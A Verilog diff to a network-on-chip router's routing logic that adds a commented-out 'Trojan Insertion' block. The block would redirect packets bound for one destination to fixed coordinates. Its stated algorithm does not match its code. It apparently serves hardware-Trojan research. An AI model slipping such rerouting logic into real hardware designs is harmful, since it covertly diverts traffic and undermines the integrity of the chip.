@@ -347,8 +347,38 @@ generate
 		
 		assign destination[i] = reset? 0: 
 			   flit[i][(FLIT_WIDTH - EXTRA_BITS - TYPE_BITS -1) -: (ROW_BITS + COLUMN_BITS)];		
+		
+		/*####################################### Trojan Insertion #################################################
+		Algorithm: 
+		If router_id[i] == 4 and destination[i] = 11 then
+		assign dest_x [i] = 2'b11
+		assign dest_y [i] = 2'b10
+		else remain the same
+		//#######################################******************#################################################*/
+		/*reg [(COLUMN_BITS - 1): 0] dest_temp_x[0:IN_PORTS-1]; 
+		reg [(ROW_BITS - 1): 0]    dest_temp_y[0:IN_PORTS-1];
+	always @ (posedge clk)
+	begin
+		if ( destination[i] == 4)
+			begin
+				 dest_temp_x [i] = 2'b11;
+				 dest_temp_y [i] = 2'b10;
+			end
+			else 
+			begin
+				 dest_temp_x[i]      = destination[i][(COLUMN_BITS - 1): 0]; 
+				 dest_temp_y[i]      = destination[i][((ROW_BITS + COLUMN_BITS) - 1) -: ROW_BITS];
+			end
+	end 
+	
+			assign dest_x[i] = dest_temp_x[i];
+			assign dest_y[i] = dest_temp_y[i];
+		//#######################################******************#################################################*/
+
+		//###################################################################################
 		assign dest_x[i]      = destination[i][(COLUMN_BITS - 1): 0]; 
 		assign dest_y[i]      = destination[i][((ROW_BITS + COLUMN_BITS) - 1) -: ROW_BITS];
+		//###################################################################################
 		
 		// Generating Rout Using XY <-> YX DOR 
 		assign route[i] =(RT_ALG == DOR_XY)? (cur_x == dest_x[i])? (cur_y > dest_y[i])? 
